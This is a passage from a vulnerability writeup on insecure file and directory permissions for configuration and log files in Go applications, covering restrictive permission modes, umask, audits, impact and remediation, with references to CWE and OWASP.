|  | `0640` | `rw-r-----` | Owner can read/write; a specific group (e.g., log shippers, monitoring agents) can read. This aligns with recommendations for system log files. |

Golang Code Fixes:

When creating directories or files, specify the secure permission mode directly in the function call:

1. **For Directories (`os.MkdirAll`, `os.Mkdir`)**:
    
    ```Go
    
    import "os"
    import "log"
    
    // Secure config directory creation
    err := os.MkdirAll("/app/config", 0700) // Owner: rwx, Group: ---, Others: ---
    if err!= nil {
        log.Fatalf("Failed to create secure config directory: %v", err)
    }
    
    // Secure log directory creation
    err = os.MkdirAll("/app/logs", 0700) // Or 0750 if a specific group needs access
    if err!= nil {
        log.Fatalf("Failed to create secure log directory: %v", err)
    }
    ```
    
    
2. **For Files (`os.OpenFile` with `os.O_CREATE`)**:
    
    ```Go
    
    import "os"
    import "log"
    
    // Secure configuration file creation (example)
    configFile, err := os.OpenFile("/app/config/settings.json", os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600) // Owner: rw, Group: ---, Others: ---
    if err!= nil {
        log.Fatalf("Failed to create secure config file: %v", err)
    }
    defer configFile.Close()
    //... write to configFile...
    
    // Secure log file creation
    logFile, err := os.OpenFile("/app/logs/application.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600) // Owner: rw, Group: ---, Others: ---
    if err!= nil {
        log.Fatalf("Failed to create secure log file: %v", err)
    }
    defer logFile.Close()
    //... use logFile for logging...
    ```

    

Using os.Chmod:

If files or directories are created by other means or if permissions need to be adjusted post-creation, os.Chmod can be used. However, it should ideally be used to further restrict permissions if needed, not to grant wider permissions after an insecure creation. The primary fix should be at the point of creation.12

```Go

err := os.Chmod("/app/existing_config.json", 0600)
if err!= nil {
    log.Printf("Warning: Failed to restrict permissions on existing config file: %v", err)
}
```

Process umask Consideration:

While the code should explicitly set secure permissions, as a defense-in-depth measure, consider setting a restrictive umask (e.g., 0077 to remove all group/other permissions, or 0027 to remove group write and all other permissions) for the Golang application process itself. This can be done in the script that launches the application or via systemd unit files. This helps ensure that even if a permission mode is accidentally omitted or set too broadly in a less critical part of the code, the umask provides a fallback level of restriction.13 However, this should not replace explicit permission setting in code for critical files.

Regular Audits and Verification:

Periodically audit the permissions of configuration and log files/directories in all environments (development, staging, production) to ensure they comply with the intended security posture. Automated checks can be integrated into deployment or monitoring processes.

The "correct" set of permissions can sometimes be context-dependent, especially when legitimate external processes like log shipping agents or monitoring tools need to access these files. In such cases, the principle of least privilege still applies: prefer granting access to a specific, trusted group over granting world-readable/writable permissions. If a log shipper needs to read logs, ensure the log files are owned by the application user, belong to a group that the log shipper is also a member of, and have permissions like `0640`. Avoid `0644` if the logs contain any sensitive data.

It is crucial to understand that fixing the Go code is only one part of the solution. Deployment scripts, container configurations (e.g., Dockerfiles using `COPY --chown` or `RUN chmod`), and infrastructure-as-code (IaC) tools (e.g., Ansible, Terraform, Chef, Puppet) must also be reviewed and configured to maintain these secure permissions throughout the application's lifecycle. A secure permission set in the Go application can be easily undone by a `chmod 777` command in a deployment script.

## **Scope and Impact**

**Scope**:

The vulnerability of improper directory and file permissions for configuration and log resources can affect:

- **Any Golang application** that programmatically creates or manages its own configuration files, log files, or the directories that contain them. This is common in standalone applications, microservices, and command-line tools written in Go.
- Systems where **multiple users or processes share the same underlying operating system environment**. In such scenarios, a low-privileged user or a compromised non-critical process might be able to access or modify the Golang application's sensitive files if permissions are too lax.
- **Containerized environments** (e.g., Docker, Kubernetes) if volumes are mounted from the host with insecure options, or if containers run with excessive privileges, or if inter-container security is weak, allowing a compromised container to affect files of another container if shared volumes have improper permissions.
- Applications deployed in **shared hosting environments**, although less common for typical Golang deployments, would be at high risk if file system isolation is not strictly enforced by the platform.

**Impact**:

The successful exploitation of this vulnerability can lead to a range of detrimental consequences:

1. **Confidentiality Breach**: This is often the most significant impact.
    - Unauthorized access to configuration files can expose sensitive data such as database credentials, API keys, encryption keys, cloud service account keys, internal service URLs, and other secrets. This information can be used to directly compromise linked systems or data stores.

    - Unauthorized access to log files can reveal Personally Identifiable Information (PII), user session tokens, sensitive operational data (e.g., financial transactions, health records if logged), detailed error messages that expose internal system architecture or other vulnerabilities, and patterns of user activity.
2. **Integrity Violation**:
    - Modification of configuration files can allow an attacker to alter the application's behavior. This could involve redirecting the application to connect to malicious external services, disabling security controls (e.g., authentication, authorization, logging), changing business logic parameters to commit fraud, or injecting settings that cause the application to execute arbitrary code or commands.
        
    - Tampering with log files can allow an attacker to erase evidence of their intrusion or other malicious activities, inject false entries to mislead investigators or trigger false alarms, or disrupt log-based monitoring and alerting systems.
3. **Availability Disruption**:
    - While often a secondary impact, if critical configuration files are deleted or corrupted due to overly permissive write access, the application may fail to start or operate correctly, leading to a denial of service.
    - If log directories are world-writable, an attacker could potentially write excessive amounts of data, leading to disk space exhaustion, which could crash the application or the entire server.
4. **Reputational Damage**: Data breaches resulting from exposed credentials or PII, or service disruptions caused by tampered configurations, can severely damage an organization's reputation and erode customer trust.
5. **Compliance Violations**: The exposure of sensitive data, particularly PII or financial/health information, due to improper access controls can lead to violations of data protection regulations such as GDPR, HIPAA, PCI DSS, etc., resulting in significant fines and legal liabilities.
6. **Further System Compromise and Lateral Movement**: Credentials or sensitive information obtained by exploiting this vulnerability can serve as a stepping stone for attackers to escalate privileges on the current system or move laterally to compromise other systems within the network.

The impact is amplified in environments with weak overall system hardening. While strong user account separation and Mandatory Access Control (MAC) systems might mitigate some risks, the vulnerability itself—the improper permission on the file or directory—remains a weak point. In modern cloud-native architectures, while some configuration might be managed by dedicated secrets management services (e.g., HashiCorp Vault, AWS Secrets Manager) and logs shipped to centralized platforms (e.g., Splunk, ELK Stack), applications often still use local files for initial bootstrapping, caching, or temporary storage. These local files remain susceptible if their permissions are not correctly managed.

## **Remediation Recommendation**

A comprehensive remediation strategy for "Improper Directory Permissions for Configuration and Log Resources" in Golang applications involves code-level changes, process improvements, and adherence to security best practices throughout the software development lifecycle.

1. **Implement Strict File Permissions (Primary Recommendation)**:
    - Adhere rigorously to the **principle of least privilege**. Grant only the absolute minimum permissions required for the application to function.
    - For directories created by the Golang application (e.g., for configs or logs), use a default permission mode of `0700` (rwx------), restricting access solely to the application's user identity. If a specific, trusted group requires access (e.g., for log shipping by a different process in that group), `0750` (rwxr-x---) might be considered, ensuring the group ownership is correctly set.

        
    - For files created by the Golang application (e.g., config files, log files), use a default permission mode of `0600` (rw-------). If a specific, trusted group requires read access, `0640` (rw-r-----) can be used. For general system log files, `0640` is a common recommendation.

        
    - Explicitly set these permissions in `os.MkdirAll`, `os.Mkdir`, and `os.OpenFile` calls.
2. **Secure Process `umask`**:
    - As a defense-in-depth measure, configure a restrictive `umask` (e.g., `0027` or `0077`) for the environment in which the Golang application process runs. This helps ensure that even if permissions are accidentally omitted in code, a baseline level of restriction is applied. This can be set in startup scripts, systemd unit files, or container entrypoints. However, this should not replace explicit permission setting in the code.
        
3. **Review and Secure Deployment and Configuration Management**:
    - Ensure that deployment scripts (shell, Python, etc.), container definitions (Dockerfiles), and configuration management tools (Ansible, Chef, Puppet, Terraform, etc.) enforce and maintain secure permissions. Any `chmod` or file ownership commands in these scripts must align with the principle of least privilege.
        
    - In Dockerfiles, use `COPY --chown=<user>:<group>` to set appropriate ownership when adding files, and avoid broad `RUN chmod` commands.
4. **Conduct Regular Audits**:
    - Periodically audit file and directory permissions in all environments (development, staging, production). This can be done manually with OS commands or automated with scripts or security auditing tools.
        
5. **Integrate SAST/DAST into CI/CD**:
    - Incorporate Static Application Security Testing (SAST) tools into the CI/CD pipeline to automatically scan Golang code for insecure permission settings in `os` package calls.
        
    - Consider post-deployment checks (a form of Dynamic Application Security Testing or configuration auditing) to verify runtime permissions.
6. **Developer Training and Secure Coding Guidelines**:
    - Educate developers on secure file handling practices in Golang, the meaning and impact of Unix file permissions, and the principle of least privilege.
    - Refer to resources like the OWASP Go Secure Coding Practices guide.
        
7. **Secure Logging Strategy**:
    - Application logs should be written by the application user with `0600` permissions.
    - If logs need to be collected by a separate agent (e.g., Fluentd, Filebeat):
        - Prefer having the agent run as the same user as the application or as a user within the application's primary group, allowing access via group permissions (e.g., log file `0640`, log directory `0750`).
        - Avoid making logs world-readable if they contain any potentially sensitive information.
        - Ensure log rotation mechanisms also create new log files with secure permissions.
8. **Secrets Management**:
    - For highly sensitive configuration data like database credentials or API keys, consider using dedicated secrets management solutions (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) instead of storing them in local configuration files where possible. If local files are unavoidable, their permissions are paramount.

Remediation is not merely a one-time code fix. It requires establishing and maintaining secure practices across development, deployment, and operations to prevent the recurrence of such vulnerabilities. A cultural shift towards "security by default," where restrictive permissions are the norm and any deviation requires explicit justification, is crucial for long-term security.

## **Summary**

The vulnerability identified as "Improper Directory Permissions for Configuration and Log Resources in Golang Applications (dir-perms-config-logs)" occurs when Golang applications establish directories and files for configuration or logging purposes with overly permissive file system settings. This common misconfiguration, often stemming from developer oversight or attempts to simplify deployment in complex environments, can lead to significant security risks.

The primary risks associated with this vulnerability include unauthorized information disclosure (e.g., exposure of credentials from configuration files or sensitive PII from logs), unauthorized modification or tampering (e.g., altering application behavior via config changes or obscuring malicious activity by manipulating logs), and potentially privilege escalation or denial of service. Although often requiring local access to exploit, its impact can be severe as it can provide attackers with critical information or control needed for further system compromise.

Key remediation strategies revolve around the consistent application of the **principle of least privilege**. This involves:

- Explicitly setting restrictive permissions in Golang code when using functions like `os.MkdirAll` and `os.OpenFile` (e.g., `0700` for directories, `0600` for files, owned by the application user).
- Ensuring deployment scripts and configuration management tools reinforce these secure permissions.
- Conducting regular audits of file system permissions in production.
- Integrating automated SAST and runtime checks into the CI/CD pipeline.

While seemingly a simple oversight, improper file and directory permissions can undermine the security posture of an application. It is an example of a broader class of access control weaknesses that necessitate diligent attention to secure defaults and configurations throughout the software development lifecycle. The ease with which this vulnerability can be introduced, coupled with its potential for significant impact, makes it a critical area of focus for developer training and automated security validation processes.

## **References**

- **CWE-276**: Incorrect Default Permissions. MITRE. Available at: https://cwe.mitre.org/data/definitions/276.html
    
- **CWE-732**: Incorrect Permission Assignment for Critical Resource. MITRE. Available at: https://cwe.mitre.org/data/definitions/732.html
    
- **CWE-284**: Improper Access Control. MITRE. Available at: https://cwe.mitre.org/data/definitions/284.html
    
- **OWASP Top 10:2021 A01:2021 – Broken Access Control**. OWASP Foundation. Available at:(https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **OWASP Top 10:2021 A05:2021 – Security Misconfiguration**. OWASP Foundation. Available at:(https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- **OWASP Web Security Testing Guide (WSTG)**, Section 4.2.9 - Test File Permission. OWASP Foundation. Available at:(https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission)

- **OWASP Application Security Verification Standard (ASVS)**. OWASP Foundation. (Referenced in context of access control and file management principles)
    
- **OWASP Go Secure Coding Practices Guide (Go-SCP)**. OWASP Foundation / Checkmarx. Available at:(https://github.com/OWASP/Go-SCP)
    
- **Golang `os` package documentation**. The Go Programming Language. Available at: https://pkg.go.dev/os
- Datadog Static Analysis Rule: `go-security/mkdir-permissions`. Datadog.
    
- Prisma Cloud SAST Policy: `CKV3_SAST_249` - Excessive directory permissions in Go applications. Prisma Cloud.
    
- Codiga Blog: "Write safe and secure code with Go" (Discusses `os.OpenFile` permissions).

- LabEx Tutorial: "How to set safe file permissions in Golang".
    
- LabEx Tutorial: "How to handle file permission in Go".
    
- NIST Special Publication 800-53: Security and Privacy Controls for Information Systems and Organizations (General principles of access control). NIST.
    
- Datadog Security Default Rule: "Ensure System Log Files Have Correct Permissions".
    
- StackOverflow: "How to neglect the umask so as to create the file with given permission" (Discusses umask).
    
- LinuxQuestions.org: "umask and permissions: has umask 007 bad side effects?" (Discusses umask implications).
